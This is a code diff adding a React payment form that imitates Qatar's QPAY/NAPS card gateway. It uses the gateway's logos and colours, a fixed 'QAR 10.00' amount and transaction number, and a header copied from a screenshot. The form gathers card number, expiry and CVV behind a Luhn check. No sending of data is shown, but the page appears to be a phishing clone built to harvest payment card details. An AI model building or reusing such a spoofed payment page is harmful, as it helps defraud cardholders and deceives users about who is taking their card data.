@@ -1,0 +1,180 @@
+
+import React, { useState, useMemo } from 'react';
+import { Eye, EyeOff } from 'lucide-react';
+
+interface PaymentFormProps {
+  onNext: () => void;
+  onPrev: () => void;
+}
+
+const checkLuhn = (cardNo: string): boolean => {
+  const digits = cardNo.replace(/\D/g, '');
+  if (digits.length < 13) return false;
+  
+  let nDigits = digits.length;
+  let nSum = 0;
+  let isSecond = false;
+  for (let i = nDigits - 1; i >= 0; i--) {
+    let d = digits.charCodeAt(i) - '0'.charCodeAt(0);
+    if (isSecond === true) d = d * 2;
+    nSum += Math.floor(d / 10);
+    nSum += d % 10;
+    isSecond = !isSecond;
+  }
+  return (nSum % 10 === 0);
+};
+
+const PaymentForm: React.FC<PaymentFormProps> = ({ onNext, onPrev }) => {
+  const [cvvShow, setCvvShow] = useState(false);
+  const [cardNumber, setCardNumber] = useState('');
+  const [cvv, setCvv] = useState('');
+  const [expiryMonth, setExpiryMonth] = useState('');
+  const [expiryYear, setExpiryYear] = useState('');
+
+  const isCardValid = useMemo(() => {
+    return cardNumber.length === 16 && checkLuhn(cardNumber);
+  }, [cardNumber]);
+
+  const months = Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0'));
+  const currentYear = new Date().getFullYear();
+  const years = Array.from({ length: 15 }, (_, i) => (currentYear + i).toString());
+
+  return (
+    <div className="w-full bg-[#f8f9fa] flex flex-col items-center pt-0 pb-8 px-4 md:px-8 font-sans" dir="rtl">
+      <div className="w-full max-w-[850px]">
+        
+        {/* Unified Summary Header based on provided image */}
+        <div className="flex flex-col items-start mb-8 px-2 gap-4">
+          {/* Top: Logo and Amount */}
+          <div className="flex items-center justify-between w-full gap-6">
+            <div className="flex flex-col items-start">
+              <div className="text-[#640d2b] text-[16px] font-bold mb-1">Amount</div>
+              <div className="text-[#640d2b] text-[28px] font-bold leading-tight">QAR 10.00</div>
+            </div>
+            <img 
+              src="/qpay.png" 
+              alt="QPAY Logo" 
+              className="h-[42px] w-auto"
+            />
+          </div>
+
+          {/* Bottom: Transaction Details */}
+          <div className="space-y-1 text-left w-full" dir="ltr">
+            <div className="text-[14px] text-[#333]">
+              <span className="font-bold">Payment Transaction Number:</span> <span className="font-medium">PRTALQ1768022149127</span>
+            </div>
+            <div className="text-[14px] text-[#333]">
+              <span className="font-bold">Transaction Details:</span> <span className="font-medium">DC</span>
+            </div>
+          </div>
+        </div>
+
+        {/* Main Payment Container */}
+        <div className="border border-[#640d2b] rounded-sm overflow-hidden bg-[#f8f9fa] shadow-sm" dir="ltr">
+          <div className="bg-[#640d2b] text-white px-5 py-2.5 text-[16px] font-semibold text-left">
+            Enter your payment card details
+          </div>
+          
+          <div className="p-8 md:p-14 bg-[#f8f9fa]">
+            <div className="max-w-[550px] mx-auto space-y-7">
+              
+              <div className="flex flex-col sm:flex-row sm:items-center">
+                <label className="w-full sm:w-[200px] sm:text-right pr-8 font-bold text-[15px] text-[#333]">Card Number</label>
+                <div className="flex-1">
+                  <input 
+                    type="text" 
+                    maxLength={16}
+                    className={`w-full h-[38px] border rounded-sm px-3 text-[15px] outline-none transition-shadow bg-white ${cardNumber && cardNumber.length === 16 && !isCardValid ? 'border-red-500 shadow-[0_0_2px_red]' : 'border-gray-400 focus:border-[#640d2b] focus:shadow-[0_0_1px_#640d2b]'}`}
+                    placeholder="Enter 16 digit card number"
+                    value={cardNumber}
+                    onChange={(e) => setCardNumber(e.target.value.replace(/[^0-9]/g, ''))}
+                  />
+                  {cardNumber.length === 16 && !isCardValid && (
+                    <div className="text-red-600 text-[12px] mt-1 font-bold">Luhn check failed</div>
+                  )}
+                </div>
+              </div>
+
+              <div className="flex flex-col sm:flex-row sm:items-center">
+                <label className="w-full sm:w-[200px] sm:text-right pr-8 font-bold text-[15px] text-[#333]">Card Expiry Date</label>
+                <div className="flex-1 flex gap-4">
+                  <select 
+                    className="flex-1 h-[38px] border border-gray-400 rounded-sm px-2 text-[15px] bg-white outline-none cursor-pointer"
+                    value={expiryMonth}
+                    onChange={(e) => setExpiryMonth(e.target.value)}
+                  >
+                    <option value="">Month</option>
+                    {months.map(m => <option key={m} value={m}>{m}</option>)}
+                  </select>
+                  <select 
+                    className="flex-1 h-[38px] border border-gray-400 rounded-sm px-2 text-[15px] bg-white outline-none cursor-pointer"
+                    value={expiryYear}
+                    onChange={(e) => setExpiryYear(e.target.value)}
+                  >
+                    <option value="">Year</option>
+                    {years.map(y => <option key={y} value={y}>{y}</option>)}
+                  </select>
+                </div>
+              </div>
+
+              {isCardValid && (
+                <div className="flex flex-col sm:flex-row sm:items-center animate-in fade-in duration-300">
+                  <label className="w-full sm:w-[200px] sm:text-right pr-8 font-bold text-[15px] text-[#333]">CVV2</label>
+                  <div className="flex-1 relative">
+                    <input 
+                      type={cvvShow ? "text" : "password"} 
+                      maxLength={3}
+                      className="w-full h-[38px] border border-gray-400 rounded-sm px-3 text-[15px] outline-none focus:border-[#640d2b] bg-white"
+                      placeholder="..."
+                      value={cvv}
+                      onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ''))}
+                    />
+                    <button 
+                      type="button" 
+                      onClick={() => setCvvShow(!cvvShow)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                    >
+                      {cvvShow ? <EyeOff size={18} /> : <Eye size={18} />}
+                    </button>
+                  </div>
+                </div>
+              )}
+
+              <div className="text-center text-[13px] text-gray-600 pt-2 leading-tight">
+                By clicking the "Continue" button, you hereby acknowledge accepting the <a href="#" className="text-blue-700 font-medium hover:underline">Terms and Conditions</a> of payment.
+              </div>
+
+              <div className="flex flex-col sm:flex-row justify-between items-center pt-8 gap-6">
+                <div className="flex gap-4 items-center opacity-90">
+                  <img src="/naps.png" alt="NAPS" className="w-[180px] h-auto" />
+                </div>
+
+                <div className="flex gap-4 w-full sm:w-auto">
+                  <button 
+                    disabled={!isCardValid || (isCardValid && cvv.length < 3) || !expiryMonth || !expiryYear}
+                    className="flex-1 sm:flex-none bg-[#640d2b] text-white font-bold px-10 py-2.5 rounded-sm text-[15px] hover:bg-[#4d0a21] transition-colors disabled:opacity-40 disabled:cursor-not-allowed shadow-sm"
+                    onClick={onNext}
+                  >
+                    Continue
+                  </button>
+                  <button 
+                    className="flex-1 sm:flex-none bg-white border border-gray-300 text-gray-800 px-10 py-2.5 rounded-sm text-[15px] hover:bg-gray-50 transition-colors shadow-sm"
+                    onClick={onPrev}
+                  >
+                    Cancel
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div className="mt-6 text-[14px] text-[#444] font-medium text-center md:text-right">
+          For proper completion of your transaction, please do not refresh this page or click the browser's back button.
+        </div>
+      </div>
+    </div>
+  );
+};
+
+export default PaymentForm;
